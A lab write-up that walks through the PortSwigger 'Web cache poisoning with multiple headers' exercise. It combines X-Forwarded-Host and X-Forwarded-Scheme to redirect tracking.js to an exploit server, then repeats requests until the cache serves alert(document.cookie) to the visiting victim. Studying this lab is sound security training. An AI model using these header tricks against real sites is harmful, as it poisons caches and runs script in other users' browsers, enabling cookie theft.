# Web Cache Poisoning with Multiple Headers


## Definition



**Web Cache Poisoning** occurs when an attacker can influence a server response using attacker-controlled input, causing 
a malicious response to be stored in a cache and later served to other users.



**Attack flow:**



```text

Attacker-controlled input

        ↓

Malicious response

        ↓
Response gets cached

        ↓

Victim receives poisoned response

```




---




## Lab Goal



Poison the cache with a response that executes:



```javascript

alert(document.cookie)

```



in the visitor's browser.



---



## Exploitation



### 1. Find the JavaScript request



In **Proxy → HTTP history**, find:


```http

GET /resources/js/tracking.js

```



Send it to **Repeater**.



### 2. Test `X-Forwarded-Host`



Add:



```http

X-Forwarded-Host: example.com

```



By itself, this has no useful effect.



### 3. Test `X-Forwarded-Scheme`



Replace it with:




```http


X-Forwarded-Scheme: nothttps

```



The server responds with a `302` redirect to the HTTPS version of the URL.



### 4. Combine the headers



Use:



```http
X-Forwarded-Host: example.com

X-Forwarded-Scheme: nothttps

```



The redirect is now changed to:



```text


https://example.com/resources/js/tracking.js

```



This shows that the application trusts both forwarded headers when constructing the redirect.



---



## Exploit Server



Create the following file on the Exploit Server:



**File name:**



```text

/resources/js/tracking.js



```



**Body:**



```javascript

alert(document.cookie)

```



Store the exploit.



---




## Poison the Cache



Set:




```http


X-Forwarded-Host: exploit-server-id.exploit-server.net

X-Forwarded-Scheme: nothttps

```



Use a cache buster first:



```http

GET /resources/js/tracking.js?cb=1234 HTTP/2

```



Keep sending the request until the response points to the Exploit Server and shows:



```http

X-Cache: hit

```



This indicates that the malicious response has been cached.



> Important: `X-Forwarded-Host` must contain only the hostname.




Correct:



```http


X-Forwarded-Host: exploit-server-id.exploit-server.net

```





Incorrect:



```http

X-Forwarded-Host: exploit-server-id.exploit-server.net/resources/js/tracking.js

```



Otherwise, the application appends the path again and produces an incorrect URL.




---



## Verify and Re-Poison




Open the poisoned URL in Burp Browser and verify that the JavaScript is being loaded from the Exploit Server.



Then remove the cache buster and repeatedly send the request until the poisoned response is cached again.



Finally, reload the home page and wait for the victim to visit it.



The victim's browser loads the poisoned JavaScript:



```javascript

alert(document.cookie)

```




The lab is solved when the alert executes for the visitor.



---



## Key Takeaways



* Multiple headers can sometimes be combined to create a cache poisoning attack.

* `X-Forwarded-Host` can influence the host used in redirects.

* `X-Forwarded-Scheme` can influence HTTP/HTTPS redirect behavior.


* The combination of both headers allows control over the redirect destination.

* A cache buster helps obtain a fresh response during testing.

* `X-Cache: hit` indicates that the response was served from the cache.

* The `X-Forwarded-Host` value should contain only the hostname, not the URL path.

* The attacker does not directly modify the cache; they cause a malicious response that the cache stores.

* The final impact is JavaScript execution in the victim's browser.



## Attack Flow



```text

X-Forwarded-Scheme + X-Forwarded-Host

                    ↓

             Controlled redirect

                    ↓

              Exploit Server


                    ↓

          Malicious JavaScript


                    ↓

              Cached response

                    ↓

                  Victim

                    ↓

          alert(document.cookie)

```





## PortSwigger



[Web Cache Poisoning — PortSwigger Web Security Academy](https://portswigger.net/web-security/web-cache-poisoning?utm_source=chatgpt.com)



[Lab: Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers?utm_source=chatgpt.com)
